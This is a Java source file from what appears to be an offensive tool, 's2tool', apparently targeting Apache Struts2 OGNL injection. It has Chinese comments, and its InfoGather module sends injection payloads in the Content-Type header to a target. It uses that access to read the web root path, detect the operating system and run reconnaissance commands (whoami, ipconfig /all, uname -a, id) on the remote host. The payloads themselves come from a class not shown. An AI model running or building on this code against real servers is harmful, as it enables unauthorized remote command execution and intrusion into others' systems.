package com.s2tool.modules;

import com.s2tool.core.HttpClient;
import com.s2tool.core.HttpResponseData;
import com.s2tool.core.PayloadBuilder;
import com.s2tool.core.Target;

/**
 * 信息获取模块：基于命令执行能力，获取目标 Web 路径与系统环境信息。
 */
public class InfoGather {

    private final HttpClient http;
    private final Target target;
    private final Executor executor;

    public InfoGather(HttpClient http, Target target) {
        this.http = http;
        this.target = target;
        this.executor = new Executor(http, target);
    }

    /**
     * 获取 Web 应用物理部署根路径（通过 OGNL 直接获取，无需命令执行）。
     *
     * @return 根路径，失败返回 null
     */
    public String getWebRoot() {
        String contentType = PayloadBuilder.webRootPayload();
        HttpResponseData resp = http.post(target.getFullUrl(), contentType,
                target.getCookie(), target.getBasicAuthUser(), target.getBasicAuthPass(),
                null, null);
        if (!resp.isConnected()) {
            return null;
        }
        String body = resp.getBody();
        if (body == null) return null;
        // 响应体可能包含 HTML 外壳，提取第一行非空内容作为路径
        for (String line : body.split("\n")) {
            String t = line.trim();
            if (!t.isEmpty() && (t.startsWith("/") || t.matches("^[A-Za-z]:.*"))) {
                return t;
            }
        }
        return null;
    }

    /**
     * 获取目标操作系统类型。
     *
     * @return "windows" / "linux" / "unknown"
     */
    public String detectOs() {
        String contentType = PayloadBuilder.osNamePayload();
        HttpResponseData resp = http.post(target.getFullUrl(), contentType,
                target.getCookie(), target.getBasicAuthUser(), target.getBasicAuthPass(),
                null, null);
        if (!resp.isConnected()) return "unknown";
        String body = resp.getBody();
        if (body == null) return "unknown";
        String lower = body.toLowerCase();
        if (lower.contains("win")) return "windows";
        if (lower.contains("linux") || lower.contains("unix") || lower.contains("mac")) return "linux";
        return "unknown";
    }

    /** 获取系统信息（多条命令，按 OS 适配） */
    public String getSystemInfo() {
        String os = detectOs();
        StringBuilder sb = new StringBuilder();
        sb.append("操作系统: ").append(os).append("\n");
        if ("windows".equals(os)) {
            sb.append("whoami: ").append(executor.exec("whoami").getOutput().trim()).append("\n");
            sb.append("ver: ").append(executor.exec("ver").getOutput().trim()).append("\n");
            sb.append("ipconfig: \n").append(executor.exec("ipconfig /all").getOutput()).append("\n");
        } else {
            sb.append("whoami: ").append(executor.exec("whoami").getOutput().trim()).append("\n");
            sb.append("uname -a: ").append(executor.exec("uname -a").getOutput().trim()).append("\n");
            sb.append("pwd: ").append(executor.exec("pwd").getOutput().trim()).append("\n");
            sb.append("id: ").append(executor.exec("id").getOutput().trim()).append("\n");
        }
        return sb.toString();
    }
}
